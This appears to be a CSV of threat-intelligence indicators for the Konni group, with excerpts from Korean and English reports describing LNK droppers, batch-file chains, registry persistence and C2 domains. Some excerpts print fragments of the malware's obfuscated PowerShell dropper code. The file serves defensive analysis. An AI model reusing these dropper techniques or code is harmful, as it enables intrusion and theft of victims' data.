schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:8611b88606e16f3f0c6523b60274c710b4672e3d334b8b7c4b38f63e6cba08e2,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:bbab596f053d8b26e318a5880e01177886a1d4413457fbc19c9a8d896a772458,observation--sha256:7bf2fed70af03543547d198b4d950983796b1406f5672383ada4266529906455,file-name,securityMail.html.lnk,securityMail.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:2ebd55f517144407879513cf0a7b845b5a8d50ba5c7bd6f977a4d62fd017568e,observation--sha256:2a8e9adff7de06635b0c8a1441b63ed995fd9f864605d9a5993acdebd248f2f6,file-name,securityMail.zip,securityMail.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:ffa5fca7d35b83eecc0a0b4aa039c3d6235aa1850f4fa410c178784e53b548a9,observation--sha256:f5c6b909d63eaa9e1150b9332a31e445112e3ee579dac0585159a54fdc81c191,file-name,securityMail_1031.html.lnk,securityMail_1031.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:0c37253ae1adb0e7613ca0d4fed02c3b658c7072369977e5ad626eed65ffa7b5,observation--sha256:59d68bf51c8c39503da386a13a7c5da244a518fa31403a124993edc27d9a0e87,file-name,securityMail_1101.html.lnk,securityMail_1101.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:38828e5660cc7aa9fe35b5fb0fb20e45a8903ef3e67406c7e4694e3379b91c03,observation--sha256:24106e653fc468487f893cd98f1acfb95b6250c2e3fa690fa2c0a949d1a2761d,file-name,star-send.php,star-send.php,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Star Star is another PHP-based, email-sending tool that TA406 uses. Proofpoint refers to this tool as Star based on the “star 3.0” HTTP title observed in some versions of the tool. The tool has also been observed with a star-send.php file name. Much like the PHPMailer tool, Star ’s purpose is to provide an easy-to-use web interface for an operator to send phishing emails. PEAR Mail 1.2.0b4 and Mail_Queue are used to assist with sending emails. At least one other DPRK actor that Proofpoint tracks",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:253a3b47a16a4a4e5622e87a17560a250c0ef8b89aa9bd6bdf6d0c290aff0c32,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 14 ○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을 ASCII 코드로 변환하면 상세 명령을 확인할 수 있습니다. $LsUvVpNHlCfpw = Get - Location; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - eq 0x1466956A } | Select - Object - ExpandProperty FullName; if ($SEvhgMDD.length - eq 0) { $LsUvVpNHlCfpw = $env: Temp; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - e,
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:94a7fa6bcca8684c4dc6169c98f472ef46db9e9588b8ee216aa3076d46b49d27,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 15 ○ 내부에 선언된 인자값은 LNK 전체 길이 ‘0x1466956A’ (342,267,242 바이트) 값을 확인합니다. 그리고 ‘0x00003C4A’ 오프셋 부터 ‘0x00006C00’ 값을 읽어 유니코드 이스케이프 포맷 6에 선언한 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일로 생성 후 실행합니다. 그리고 기존 LNK 파일은 삭제됩니다. Unicode Escape Unicode Unescape \uC18C\uBA85\uC790\uB8CC \u0020\uBAA9\uB85D\u0028 \uAD6D\uC138\uC9D5\uC218 \uBC95\u0020\uC2DC\uD589 \uADDC\uCE59\u0029\u002E \u0068\u0077\u0070 소명자료 목록(국세징수법 시행규칙).hwp [표 03] 유니코드 문자 변환 화면 ○ 다음으로 ‘0x0000A84A’ 오프셋 부터 ‘0x0",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:0b7eef6a34297571e8b2919b5b154fd3f6ddeeadffde5d03ad37475d59d94754,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:db182ee120c0bf5c04e2013af62865b8a22568f07d67861c06360ad23795ed40,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:fec9304108142232352e6668f5754b0226253580508d8797527875c668887132,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 22 b. ‘start.vbs’ ○ 본 파일은 ZIP 파일이 풀린 후 가장 먼저 실행되는 파일로, Visual Basic Script 명령을 수행하게 됩니다. 파일명 start.vbs MD5 19ecb637cb3ba2660994eb87990c82d7 SHA1 cd81d310dd6b6029959e3c57dc11b751ab8220f4 SHA256 3c79f5bc1608f7582253cf201824d75d7c5cfbaa15334797 9e3ca701ceaefa20 [표 06] start.vbs 파일 HASH 정보 화면 ○ 파일 내부에는 다음과 같은 명령어를 가지고 있으며, 압축이 풀렸던 동일 경로의 ‘73888454.bat’ 배치 파일을 실행(Run)하는 명령을 수행하고 종료합니다. [그림 13] VBS 스크립트 내부 코드 화면 [그림 14] start.vbs 의 스크립트 코드를 실행시키기 위한 w",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:c9b35069d80c15b33d3868e19e39fc2f01dc82e4a75fcc4060409152459832eb,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:857f99cd4a11ef57a92dfe2728830696ef8fd094061f8e00313946360ee6c6a5,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 26 ○ 영국 정보 기관인 GCHQ 에서 만든 데이터 분석 및 변환을 위한 오픈 소스 웹 프로그램인 CyberChef 기능을 통해 [Base64+RC4] 데이터를 간편하게 복호화할 수 있습니다.8 [그림 16] CyberChef 디코딩 화면 ○ 다음으로 57 초 대기시간을 유지한 후 ‘pakistan.txt’ 파일 비교루틴을 수행하게 됩니다. [그림 17] 73888454.bat 실행에 의해 자동실행 레지스트리 등록된 start.vbs 8 CyberChef 웹 사이트,
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:a6e99a4e77a3c07f70f68ad28ea5b8e093d0aa75651694a0ae6718d570a683e7,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:2e503e59e8312427b07eb8994f5d35a73e8b1cbc0c16af05616991d827de16ca,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 6 e. EDR 솔루션을 통한 가시성 확보 (Visibility) ○ 본 사례의 경우 악성 LNK 바로가기 파일 구조 내부에 ‘자금출처명세서(부가가치세법 시행규칙).hwp’ 정상 문서와 ‘04769.zip’ 파일이 임베디드 된 형태로 보관되어 있습니다. 정상 문서 파일은 LNK 파일이 실행된 경로에 만들어지고, 압축 파일은 ‘Public’ 공용 폴더 경로에 생성됩니다. 압축은 공용 경로 하위의 ‘Documents’ 공용 문서 경로에 풀리고, ‘start.vbs’ 파일이 실행되는 과정을 거치게 됩니다. ○ ‘04769.zip’ 파일 내부에는 총 5 개의 BAT 파일이 존재하고, ‘start.vbs’ 파일에 의해 맨 처음 호출되며, 배치 파일 내부명령에 따라 순차적으로 악성 행위를 수행하게 됩니다. 물론 변형에 따라 복잡도는 조금씩 차이가 발생합니다. Genian EDR 3 제품은 이처럼 복잡성을",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:70ae931f008f39b341176f81c59650179057f1635cf833993ed51787fe4387f4,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
